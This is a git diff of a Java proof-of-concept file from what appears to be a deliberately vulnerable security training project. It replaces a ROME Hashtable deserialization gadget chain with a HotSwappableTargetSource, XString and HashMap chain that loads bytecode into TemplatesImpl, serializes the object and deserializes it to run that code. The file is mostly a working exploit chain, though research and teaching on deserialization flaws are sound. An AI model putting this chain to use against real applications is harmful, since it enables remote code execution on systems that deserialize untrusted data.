@@ -1,10 +1,12 @@
 package com.madaha.codesecone.controller.AdvancedAttack.deserialize.RomeDeserialize;
 
-import com.rometools.rome.feed.impl.ObjectBean;
 import com.rometools.rome.feed.impl.ToStringBean;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import org.springframework.aop.target.HotSwappableTargetSource;
 
+import javax.management.BadAttributeValueExpException;
 import javax.xml.transform.Templates;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -13,11 +15,9 @@ import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.nio.file.Files;
 import java.nio.file.Paths;
-import java.util.Hashtable;
+import java.util.HashMap;
 
-
-public class ROME_HashTable_PocTest {
-
+public class ROME_HotSwappableTargetSource_PocTest {
     // 获取项目根目录，设置expPath;
     private static String projectRoot = System.getProperty("user.dir");
     private static String rome_ser_Path = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\RomeDeserialize\\ROME_Poc.ser";
@@ -42,19 +42,10 @@ public class ROME_HashTable_PocTest {
         return objectInputStream.readObject();
     }
 
-    /**
-     *  * TemplatesImpl.getOutputProperties()
-     *  * ToStringBean.toString(String)
-     *  * ToStringBean.toString()
-     *  * EqualsBean.beanHashCode()
-     *  * ObjectBean.hashcode()
-     *  * HashTable.reconstitutionPut(Entry)
-     *  * HashTable.readObject(ObjectInputStream)
-     *
-     * @throws Exception
-     */
-    public static void rome_HashTable_Poc() throws Exception {
+
+    public static void rome_HotSwappableTargetSource_Poc() throws Exception {
         TemplatesImpl templatesimpl = new TemplatesImpl();
+
         byte[] bytecodes = Files.readAllBytes(Paths.get(TemplatesImpl_class_Path));
 
         setFieldValue(templatesimpl, "_name", "PocTest");
@@ -62,19 +53,22 @@ public class ROME_HashTable_PocTest {
         setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
 
         ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
-        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
 
-        Hashtable hashTable = new Hashtable();
-        hashTable.put(objectBean, "rome");
+        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
+        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("PocTest"));
 
-        // 序列化
-        serialize(hashTable);
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        hashMap.put(h1, h1);
+        hashMap.put(h2, h2);
 
-        // 反序列化
+        serialize(hashMap);
         deserialize(rome_ser_Path);
     }
 
     public static void main(String[] args) throws  Exception {
-        rome_HashTable_Poc();
+//        rome_HotSwappableTargetSource_Poc();
+        deserialize(rome_ser_Path);
+
     }
+
 }
